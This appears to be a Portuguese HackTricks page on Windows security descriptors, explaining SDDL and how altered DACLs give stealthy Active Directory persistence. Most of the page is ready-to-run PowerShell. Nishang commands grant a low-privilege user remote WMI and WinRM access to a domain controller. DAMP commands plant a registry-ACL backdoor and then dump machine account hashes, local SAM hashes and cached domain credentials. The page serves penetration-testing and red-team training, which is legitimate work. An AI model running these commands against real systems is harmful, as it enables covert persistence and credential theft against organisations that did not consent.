# Descritores de Segurança

{{#include ../../banners/hacktricks-training.md}}

## Descritores de Segurança

Os descritores de segurança do Windows contêm um SID de proprietário, um SID de grupo primário, uma ACL discricionária (DACL) que controla o acesso e uma ACL de sistema (SACL) usada principalmente para auditoria. A Security Descriptor Definition Language (SDDL) é a representação textual; uma string ACE tem o formato `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Um descritor de segurança armazena quem é o proprietário de um objeto protegível e quais principals têm permissão ou são impedidos de exercer direitos específicos sobre ele. Se um atacante puder alterar uma DACL, ele poderá conceder a um principal com poucos privilégios direitos que normalmente exigem uma função administrativa.

Isso torna os descritores modificados de forma restrita úteis para persistence: a conta permanece fora de grupos privilegiados óbvios, enquanto mantém acesso a uma superfície de gerenciamento específica. Preserve o descritor original antes de testar, para que a alteração possa ser removida exatamente.

### Acesso ao WMI

Você pode conceder a um usuário acesso para **executar WMI remotamente** [**usando isto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Acesso ao WinRM

Conceda a um usuário acesso a um endpoint remoto do PowerShell/WinRM com a função `Set-RemotePSRemoting` do Nishang:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acesso remoto a hashes

DAMP pode criar um backdoor de registry-ACL que posteriormente permite a recuperação remota do hash da conta da máquina, dos hashes SAM locais e das credenciais de domínio em cache. Conceder esses direitos restritos a uma conta comum — especialmente em um controlador de domínio — fornece uma persistência poderosa sem a necessidade de associação a grupos privilegiados.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Confira [**Silver Tickets**](silver-ticket.md) para aprender como você poderia usar o hash da conta de computador de um Domain Controller.

## References

- [1] [Linguagem de Definição de Descritores de Segurança - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Projeto de Modificação de ACL Discricionária](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Formato de string do descritor de segurança](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
